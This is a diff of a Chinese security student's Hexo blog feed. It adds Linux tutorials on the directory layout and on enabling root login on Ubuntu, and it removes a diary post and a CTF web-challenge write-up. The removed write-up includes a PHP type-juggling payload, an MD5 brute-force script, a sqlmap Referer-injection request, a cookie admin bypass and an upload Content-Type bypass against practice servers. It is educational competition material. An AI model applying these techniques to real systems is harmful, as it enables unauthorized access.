@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://uknowsec.cn/"/>
-  <updated>2017-03-12T04:45:00.729Z</updated>
+  <updated>2017-03-17T13:21:15.910Z</updated>
   <id>http://uknowsec.cn/</id>
   
   <author>
@@ -16,11 +16,102 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>[第四周]LinuxLinux各个目录的作用及内容</title>
+    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-LinuxLinux%E5%90%84%E4%B8%AA%E7%9B%AE%E5%BD%95%E7%9A%84%E4%BD%9C%E7%94%A8%E5%8F%8A%E5%86%85%E5%AE%B9.html"/>
+    <id>http://uknowsec.cn/posts/linux/第四周-LinuxLinux各个目录的作用及内容.html</id>
+    <published>2017-03-17T12:54:08.000Z</published>
+    <updated>2017-03-17T13:21:15.910Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h2 id="主要目录"><a href="#主要目录" class="headerlink" title="主要目录"></a>主要目录</h2><h3 id=""><a href="#" class="headerlink" title="/"></a>/</h3><p>/处于Linux文件系统树形结构的最顶端，它是Linux文件系统的入口，所有的目录、文件、设备都在/之下。</p>
+<h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>该目录存放着系统最常用的最重要的命令，相当于DOS下的内部命令，只不过它们是以独立的文件形式存在。比如：ls、cp、mkdir等命令。这个目录中的文件都是可执行的并且是普通用户都可以使用的命令。作为系统最基础的命令都放在这里。</p>
+<h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>该目录是系统存放程序的地方，比如普通命令、帮助文件、安装的软件等。这个目录下有很多的文件和目录。当我们安装一个Linux发行版官方提供的软件包时，大多安装在这里。当有涉及服务器的配置文件时，会把配置文件安装在/etc目录中。/usr目录下包括涉及字体目录/usr/share/fonts、帮助目录/usr/share/man或/usr/share/doc等。</p>
+<h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>该目录的内容是经常变动的，/var下有/var/log目录用来存放系统日志的目录。/var/www目录用来定义Apache服务器站点存放目录。/var/lib用来存放一些库文件。</p>
+<h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>大多数涉及系统管理的命令都存放在该目录中，它是超级权限用户root的可执行命令存放地，普通用户无权限执行这个目录下的命令，凡是目录sbin中包含的命令都是root权限才能执行的。</p>
+<h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>Linux超级权限用户(系统管理员)root的主目录。</p>
+<h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>普通用户的主目录都默认存放在该目录中，比如：有个用户叫wang，那它的主目录就是/home/wang，也可以用~wang表示。</p>
+<h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>该目录是系统配置文件的所在地，一些服务器的配置文件也在这里，比如：用户帐号及密码配置文件等。</p>
+<h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>Linux的内核及引导系统的程序所需要的文件都存放在该目录中，比如vmlinuz、initrd.img等文件都位于这个目录中。在一般情况下，GRUB或LILO系统引导管理器在这个目录中。</p>
+<h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>该目录是可选的软件包安装目录，有些软件包我们可以将它安装在该目录中。</p>
+<h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>该目录用于存放临时文件，有时用户运行程序的时候，会产生一些临时文件。/tmp就是用来存放临时文件的。/var/tmp目录和该目录的作用是相似的。</p>
+<h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>在ext2或ext3文件系统中，当系统意外崩溃或机器意外关机，而产生的一些文件碎片就存放在该目录中。当系统启动在过程中fsck工具会检查这里，并修复已经损坏的文件系统。 有时系统发生问题，有很多的文件被移到这个目录中，可能要用手工的方式来修复，或移到文件原来的位置上。</p>
+<h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>该目录用于存放库文件，这个目录里存放着系统最基本的共享库，其作用类似于Windows里的.dll文件。几乎所有的应用程序都须要用到这些共享库。</p>
+<h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>该目录是用于存放挂载储存设备的挂载目录的，系统提供这个目录是让用户临时挂载别的文件系统，比如有cdrom等目录。</p>
+<h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>操作系统运行时，进程（正在运行中的程序）信息及内核信息（比如cpu、硬盘分区、内存信息等）存放在这里。/proc目录是伪装的文件系统proc的挂载目录，proc并不是真正的文件系统。因此，这个目录是一个虚拟的目录，它是系统内存的映射，我们可以通过直接访问这个目录来获取系统信息。也就是说，这个目录的内容不在硬盘上而是在内存里。</p>
+<h3 id="misc"><a href="#misc" class="headerlink" title="/misc"></a>/misc</h3><p>该目录可以用来存放杂项文件或目录，即那些用途或含义不明确的文件或目录可以存放在该目录下。</p>
+<h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>即插即用型存储设备的挂载点自动在该目录下创建。比如USB盘系统自动挂载后，会在这个目录下产生一个目录；CDROM/DVD自动挂载后，也会在这个目录中创建一个目录，类似于cdrom这个目录。该目录只有在最新的发行套件上才有。</p>
+<h2 id="其余目录"><a href="#其余目录" class="headerlink" title="其余目录"></a>其余目录</h2><h3 id="initrd"><a href="#initrd" class="headerlink" title="/initrd"></a>/initrd</h3><p>系统在启动前的内核是压缩的（这和ramdisk有关），当系统启动时需要解压缩，该目录就是解压缩时的临时目录，当启动完后又将该目录清空。</p>
+<h3 id="usr-man"><a href="#usr-man" class="headerlink" title="/usr/man"></a>/usr/man</h3><p>该目录是Linux系统帮助文档的存放目录。</p>
+<h3 id="proc-cpuinfo"><a href="#proc-cpuinfo" class="headerlink" title="/proc/cpuinfo"></a>/proc/cpuinfo</h3><p>关于处理器的信息，如类型、厂家、型号和性能等。比如cat /proc/cpuinfo    </p>
+<h3 id="proc-devices"><a href="#proc-devices" class="headerlink" title="/proc/devices"></a>/proc/devices</h3><p>当前运行内核所配置的所有设备清单。    </p>
+<h3 id="proc-filesystems"><a href="#proc-filesystems" class="headerlink" title="/proc/filesystems"></a>/proc/filesystems</h3><p>当前运行内核所配置的文件系统。    </p>
+<h3 id="proc-dma"><a href="#proc-dma" class="headerlink" title="/proc/dma"></a>/proc/dma</h3><p>当前正在使用的DMA通道。    </p>
+<h3 id="proc-interrupts"><a href="#proc-interrupts" class="headerlink" title="/proc/interrupts"></a>/proc/interrupts</h3><p>正在使用的中断和曾经有多少个中断。    </p>
+<h3 id="proc-ioports"><a href="#proc-ioports" class="headerlink" title="/proc/ioports"></a>/proc/ioports</h3><p>当前正在使用的I/O端口。    </p>
+<h3 id="etc-init-d"><a href="#etc-init-d" class="headerlink" title="/etc/init.d"></a>/etc/init.d</h3><p>这个目录是用来存放系统或服务器以System V模式启动的脚本，这在以System V模式启动或初始化的系统中常见。比如RedHat Fedora。    </p>
+<h3 id="etc-xinetd-d"><a href="#etc-xinetd-d" class="headerlink" title="/etc/xinetd.d"></a>/etc/xinetd.d</h3><p>如果服务器是通过xinetd模式运行的，它的脚本要放在这个目录下。有些系统没有这个目录，比如Slackware，有些老的版本也没有。在Redhat Fedora中比较新的版本中存在。    </p>
+<h3 id="etc-rc-d"><a href="#etc-rc-d" class="headerlink" title="/etc/rc.d"></a>/etc/rc.d</h3><p>这是Slackware发行版中有的一个目录，是BSD方式启动脚本的存放地，比如定义网卡，服务器开启脚本等。    </p>
+<h3 id="etc-X11"><a href="#etc-X11" class="headerlink" title="/etc/X11"></a>/etc/X11</h3><p>是X-Window相关的配置文件存放地。    </p>
+<h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>这个目录是可执行程序的目录，普通用户就有权限执行。当我们从系统自带的软件包安装一个程序时，他的可执行文件大多会放在这个目录。相似的目录是/usr/local/bin目录。有时/usr/bin中的文件是/usr/local/bin的链接文件。    </p>
+<h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>这个目录也是可执行程序的目录，但大多存放涉及系统管理的命令。只有root权限才能执行，相似目录是/sbin或/usr/local/sbin或/usr/X11R6/sbin等。    </p>
+<h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>这个目录一般是用来存放用户自编译安装软件的存放目录。一般是通过源码包安装的软件，如果没有特别指定安装目录的话，一般是安装在这个目录中。    </p>
+<h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>该目录和/lib目录相似，是库文件的存储目录。存放一些常用的共享库。    </p>
+<h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>该目录用于存放系统共用的东西，比如/usr/share/fonts是字体目录，是用户都共用的。    </p>
+<h3 id="usr-share-doc"><a href="#usr-share-doc" class="headerlink" title="/usr/share/doc"></a>/usr/share/doc</h3><p>该目录是Linux共享文档的存放地。    </p>
+<h3 id="usr-share-man"><a href="#usr-share-man" class="headerlink" title="/usr/share/man"></a>/usr/share/man</h3><p>该目录是共享的帮助文件的存放地。    </p>
+<h3 id="usr-src"><a href="#usr-src" class="headerlink" title="/usr/src"></a>/usr/src</h3><p>该目录是内核源码存放地，下面有内核源码目录，比如linux、linux-2.xxx.xx目录等。有的系统也会把一些源码软件包安装在这里，比如Redhat Fedora。另外Redhat 4.0/5.0，它的内核源码包的目录位于/usr/src/kernels目录下的某个目录中（只有安装后才会生成相应目录）。    </p>
+<h3 id="var-adm"><a href="#var-adm" class="headerlink" title="/var/adm"></a>/var/adm</h3><p>比如软件包安装信息、日志、管理信息等就存放在该目录下，在Slackware操作系统中是有这个目录的。在Fedora中好象没有。    　</p>
+<h3 id="var-log"><a href="#var-log" class="headerlink" title="/var/log"></a>/var/log</h3><p>该目录用于存放系统日志。    </p>
+<h3 id="var-spool"><a href="#var-spool" class="headerlink" title="/var/spool"></a>/var/spool</h3><p>打印机、邮件、代理服务器等假脱机目录存放在该目录下。</p>
+<h2 id="附图"><a href="#附图" class="headerlink" title="附图"></a>附图</h2><p><img src="http://obr4sfdq7.bkt.clouddn.com/2011110620371927.png" alt=""></p>
+<p>转载自 <a href="http://www.cnblogs.com/shishm/" target="_blank" rel="external">时邵猛</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>[第四周]Ubuntu 16.10下root用户直接登录</title>
+    <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E5%9B%9B%E5%91%A8-Ubuntu-16-10%E4%B8%8Broot%E7%94%A8%E6%88%B7%E7%9B%B4%E6%8E%A5%E7%99%BB%E5%BD%95.html"/>
+    <id>http://uknowsec.cn/posts/linux/第四周-Ubuntu-16-10下root用户直接登录.html</id>
+    <published>2017-03-17T12:38:37.000Z</published>
+    <updated>2017-03-17T12:52:46.884Z</updated>
+    
+    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
+<h3 id="设置root密码"><a href="#设置root密码" class="headerlink" title="设置root密码"></a>设置root密码</h3><p>使用如下命令设置root密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo passwd root</div></pre></td></tr></table></figure></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><p>使用如下命令测试是否可以进入root用户，如果@前的用户名变为root则说明设置成功<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">su root</div></pre></td></tr></table></figure></p>
+<h3 id="修改文件"><a href="#修改文件" class="headerlink" title="修改文件"></a>修改文件</h3><p>进入到进入到/usr/share/lightdm/lightdm.conf.d/目录,使用如下命令打开此文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit 50-unity-greeter.conf</div></pre></td></tr></table></figure></p>
+<p>在此文件中添加如下内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">user-session=ubuntu</div><div class="line">greeter-show-manual-login=true</div><div class="line">all-guest=false</div></pre></td></tr></table></figure></p>
+<h3 id="重启系统"><a href="#重启系统" class="headerlink" title="重启系统"></a>重启系统</h3><p>点击登录，然后输入root用户，再输入前面设置的密码</p>
+<h3 id="修复错误"><a href="#修复错误" class="headerlink" title="修复错误"></a>修复错误</h3><p>登录系统后会出现：读取/root/.profile时发现错误的对话框<br>点击确定进入系统，使用如下命令修改文件，找到mesg n，修改为：tty -s &amp;&amp; mesg n<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gedit /root/.profile</div></pre></td></tr></table></figure></p>
+<p>保存退出，重启系统即可。</p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;点击阅读全文&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Linux" scheme="http://uknowsec.cn/categories/linux/"/>
+    
+    
+  </entry>
+  
+  <entry>
     <title>[第三周]Ubuntu 16.10下JDK8的安装配置</title>
     <link href="http://uknowsec.cn/posts/linux/%E7%AC%AC%E4%B8%89%E5%91%A8-Ubuntu-16-10%E4%B8%8BJDK8%E7%9A%84%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE.html"/>
     <id>http://uknowsec.cn/posts/linux/第三周-Ubuntu-16-10下JDK8的安装配置.html</id>
     <published>2017-03-12T04:29:39.000Z</published>
-    <updated>2017-03-12T04:45:00.729Z</updated>
+    <updated>2017-03-17T13:09:56.400Z</updated>
     
     <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
 <h2 id="JDK8安装"><a href="#JDK8安装" class="headerlink" title="JDK8安装"></a>JDK8安装</h2><p>安装只需输入命令即可</p>
@@ -32,7 +123,7 @@
 <p>保存退出，输入下面的命令使修改生效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">:wq</div><div class="line">source /etc/environment</div></pre></td></tr></table></figure></p>
 <p>测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $JAVA_HOME</div></pre></td></tr></table></figure></p>
 <p>若显示刚才添加的路径则说明配置成功。</p>
-<h2 id="简单编译运行"><a href="#简单编译运行" class="headerlink" title="简单编译运行"></a>简单编译运行</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line"></div><div class="line">    /**</div><div class="line">    * 输出一行字符串“Hello World!”</div><div class="line">    */</div><div class="line"></div><div class="line">    public static void main(String[] args) &#123;</div><div class="line"></div><div class="line">    System.out.println(&quot;Hello World!&quot;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<h2 id="简单编译运行"><a href="#简单编译运行" class="headerlink" title="简单编译运行"></a>简单编译运行</h2><h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">public class test &#123;</div><div class="line"></div><div class="line">   /*</div><div class="line">    * 输出一行字符串“Hello World!”</div><div class="line">    */</div><div class="line"></div><div class="line">    public static void main(String[] args) &#123;</div><div class="line"></div><div class="line">    System.out.println(&quot;Hello World!&quot;);</div><div class="line"></div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
 <h3 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">javac test.java</div><div class="line">java test</div></pre></td></tr></table></figure>
 <p><img src="http://obr4sfdq7.bkt.clouddn.com/QQ%E6%88%AA%E5%9B%BE20170312124230.jpg" alt=""></p>
 ]]></content>
@@ -4275,185 +4366,6 @@ HTML DOM - 针对 HTML 文档的标准模型
     </summary>
     
       <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>2016-08-28</title>
-    <link href="http://uknowsec.cn/posts/life/2016-08-28.html"/>
-    <id>http://uknowsec.cn/posts/life/2016-08-28.html</id>
-    <published>2016-08-28T14:21:30.000Z</published>
-    <updated>2016-11-19T04:50:09.571Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>昨天晚上结识一个今年大四的南京大表哥。跟他聊了很多，有感遂写下这篇博文。</p>
-<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><p>明天就是大二了，大一一年感觉自己有点混。学习上混，自己想接触的领域也比较混。大一经历了很多，第一次来到南京这个陌生的城市。第一次接触到“信息安全”的名词，第一个想以后从事这个行业的决定。我自己现在也不知道这是个冲动还是我兴趣使然，内心使然。正如TK教主曾经说的：“如果你对于安全这个行业仅仅是为了赚一口饭，那无异于一个性冷淡拍AV。如果你是真正的对于一种技术的追崇，让你会无限的提高，永远对于他有一种新鲜感。”兴趣使然，我依旧坚持自己的选择。我毅不忘初心，亦望始终可得。大一懒懒散散的过去了，从我初了解到这个领域的时候。都是一些小打小闹，在各大论坛也说不得是摸爬滚打。我自己甚至也不知道自己有没有在这过去一年之中学到了技术上的一些东西，结识到一些有益的朋友。这一年自己接触到技术上的问题很浅显，之前一个跟我聊天的学长也提醒过我：“这是一个浮躁的行业，浮躁的人喜欢急功近利，刚刚追求表面”在我听到这句话时，的确给我狠狠的以一巴掌。急功近利地去挖掘漏洞而不了解他的原理，急功近利地去使用他人写的工具而不能自己了解而后改善之，急功近利地卖弄而不能脚踏实地地学习等。大一的暑假也是匆匆忙忙简简单单学习了一下python和PHP的内容，另外也做了一些CTF关于WEB方面的练习，结识了一些打CTF比赛的小伙伴。之前也是踌躇满志地想在暑假提高自己的能力，然后我并没感觉到效果。又是一个新的学期，在这个学期第一天的前夕。还是给自己定下一些目标和计划吧。首先应该是四级吧，先每天做几个题目把它给搞定吧。然后就是上个学期我在图书馆推荐了不少关于安全类的书籍差不多应该可以到馆了吧，尽力去借来看看。还有Python和PHP的内容继续进行学习吧。关于自己专业课方面尽力学好，期末不挂科吧。最后昨天晚上那大四学长跟我说自己拉人组Team的问题，这个可能真的是我之前不敢想的一个事情，但是他给我了不少的鼓励。我也是跃跃欲试的，但是感觉心有余而力不足吧。我个人的能力还是不行的，这种Team在学校搞起来怕也很难发展并不能得到相关方面的支持。还是自己先学习好技术吧，待到时机成熟，也说不定。言至此。</p>
-<h2 id="0x02-结语"><a href="#0x02-结语" class="headerlink" title="0x02 结语"></a>0x02 结语</h2><p>这篇博文算是我大一的一个学期的总结和大二新的计划和目标的先行书吧，望以此勉之。</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;点击阅读全文&lt;br&gt;
-    
-    </summary>
-    
-      <category term="生活" scheme="http://uknowsec.cn/categories/life/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title> 2016年X-NUCA全国高校网安联赛--赛前指导练习题web进阶篇Writeup </title>
-    <link href="http://uknowsec.cn/posts/ctf/2016%E5%B9%B4X-NUCA%E5%85%A8%E5%9B%BD%E9%AB%98%E6%A0%A1%E7%BD%91%E5%AE%89%E8%81%94%E8%B5%9B-%E8%B5%9B%E5%89%8D%E6%8C%87%E5%AF%BC%E7%BB%83%E4%B9%A0%E9%A2%98web%E8%BF%9B%E9%98%B6%E7%AF%87Writeup.html"/>
-    <id>http://uknowsec.cn/posts/ctf/2016年X-NUCA全国高校网安联赛-赛前指导练习题web进阶篇Writeup.html</id>
-    <published>2016-08-13T08:42:44.000Z</published>
-    <updated>2016-11-19T04:49:32.793Z</updated>
-    
-    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一次写Writeup，尝试一下吧！</p>
-<h2 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h2><h3 id="捉迷藏"><a href="#捉迷藏" class="headerlink" title="捉迷藏"></a>捉迷藏</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>捉迷藏<br>描述：从页面中找到隐藏的flag<br><a href="http://218.76.35.75:20111" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%871.png" alt=""><br>F12审查元素发现有一个Index.php的链接，把背景去掉。点击链接得到flag</p>
-<h4 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h4><p>flag{th!5!5n0tth3fl@g}</p>
-<h3 id="简单问答"><a href="#简单问答" class="headerlink" title="简单问答"></a>简单问答</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>简单问答<br>描述：这几个小问题实在是太简单了，相信你一定能获得满分<br><a href="http://218.76.35.75:20112" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>审查元素将按钮键的disabled改为abled。<br>利用burpsuite抓取数据包，修改参数提交得到flag<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%872.png" alt=""><br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%873.png" alt=""></p>
-<h4 id="Flag-1"><a href="#Flag-1" class="headerlink" title="Flag"></a>Flag</h4><p>flag{W3ll_d0n3}</p>
-<h3 id="后台后台后台"><a href="#后台后台后台" class="headerlink" title="后台后台后台"></a>后台后台后台</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>后台后台后台<br>描述：登录这个网站很容易，请进入后台寻找flag<br><a href="http://218.76.35.75:20113" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>利用burpsuite抓取数据包，把cookie中的Member参数修改为Admin的base64的编码，得到flag.<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%875.png" alt=""></p>
-<h4 id="Flag-2"><a href="#Flag-2" class="headerlink" title="Flag"></a>Flag</h4><p>flag{C00ki3_n0m_n0m_n0m}</p>
-<h3 id="php是最好的语言"><a href="#php是最好的语言" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>php是最好的语言<br>描述：据说php是最好的语言，perfect？来试试看<br><a href="http://218.76.35.75:20114" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://218.76.35.75:20114/?foo=&#123;&quot;bar1&quot;:&quot;2017f&quot;,&quot;bar2&quot;:[[1,1],1,1,1,1]&#125;&amp;cat[0]=123&amp;cat[1][]=1&amp;dog=%00htctf2016</div></pre></td></tr></table></figure></p>
-<h4 id="Flag-3"><a href="#Flag-3" class="headerlink" title="Flag"></a>Flag</h4><p>flag{php_i5_n0t_b4d}</p>
-<h3 id="忘记密码了"><a href="#忘记密码了" class="headerlink" title="忘记密码了"></a>忘记密码了</h3><h4 id="题目-4"><a href="#题目-4" class="headerlink" title="题目"></a>题目</h4><p>忘记密码了<br>描述：在这个网站，记录了小伙伴们的密码。 可是slash的密码怎么也找不到了，你能帮忙找出来么<br><a href="http://218.76.35.75:20115/" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><p>把bob和sam的MD5解出来分别是bob317和sam429,利用脚本爆破密码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">import requests</div><div class="line">import hashlib</div><div class="line"></div><div class="line">r=requests.session()</div><div class="line"></div><div class="line">url=&quot;http://218.76.35.75:20115/index.php&quot;</div><div class="line">for i in xrange(1000):</div><div class="line"></div><div class="line">    header=&#123;&quot;User-Agent&quot;:&quot;Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:47.0) Gecko/20100101 Firefox/47.0&quot;&#125;</div><div class="line"></div><div class="line">    param=hashlib.md5(&quot;slash&quot;+str(i)).hexdigest()</div><div class="line"></div><div class="line">    tmpurl=url+&quot;?page=&quot;+param</div><div class="line"></div><div class="line">    print tmpurl</div><div class="line"></div><div class="line">    result=r.get(tmpurl,headers=header)</div><div class="line"></div><div class="line">    content=result.content</div><div class="line"></div><div class="line">    if &apos;flag&apos; in content or &apos;Flag&apos; in content or &apos;FLAG&apos; in content:</div><div class="line"></div><div class="line">        print content</div><div class="line"></div><div class="line">        print i</div><div class="line"></div><div class="line">        break</div></pre></td></tr></table></figure></p>
-<p>得到结果<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%876.png" alt=""></p>
-<h4 id="Flag-4"><a href="#Flag-4" class="headerlink" title="Flag"></a>Flag</h4><p>flag{n1ce_te4m_n1ce_Rock}</p>
-<h3 id="php是最好的语言-1"><a href="#php是最好的语言-1" class="headerlink" title="php是最好的语言"></a>php是最好的语言</h3><h4 id="题目-5"><a href="#题目-5" class="headerlink" title="题目"></a>题目</h4><p>http 头注入<br>描述：换个浏览器试试？</p>
-<p><a href="http://218.76.35.75:20121" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><p>抓包得到数据包，Referer处加*号。sqlmap -r xx.txt。得到flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">GET /heetian.php HTTP/1.1</div><div class="line">Host: 218.76.35.75:20121</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Accept-Encoding: gzip, deflate</div><div class="line">Referer: http://www.google.com/search?hl=en&amp;q=*</div><div class="line">Cookie: PHPSESSID=gr7gtgjm8v0q5a9j3ampntgmp0; User=JohnTan101; Member=Tm9ybWFs</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div></pre></td></tr></table></figure></p>
-<h4 id="Flag-5"><a href="#Flag-5" class="headerlink" title="Flag"></a>Flag</h4><p>flag{Y0ugetT82f00000laev}</p>
-<h3 id="简单的文件上传"><a href="#简单的文件上传" class="headerlink" title="简单的文件上传"></a>简单的文件上传</h3><h4 id="题目-6"><a href="#题目-6" class="headerlink" title="题目"></a>题目</h4><p>简单的文件上传<br>描述：上传php 文件就给你flag<br><a href="http://218.76.35.75:20122/" target="_blank" rel="external">题目链接</a></p>
-<h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>上传一个php文件，抓包将Content-Type改为 image/jpeg上传，得到flag.<br><img src="http://obr4sfdq7.bkt.clouddn.com/%E5%9B%BE%E7%89%877.png" alt=""></p>
-<h4 id="Flag-6"><a href="#Flag-6" class="headerlink" title="Flag"></a>Flag</h4><p>flag{Upl00d30668ss9h97aFil3}</p>
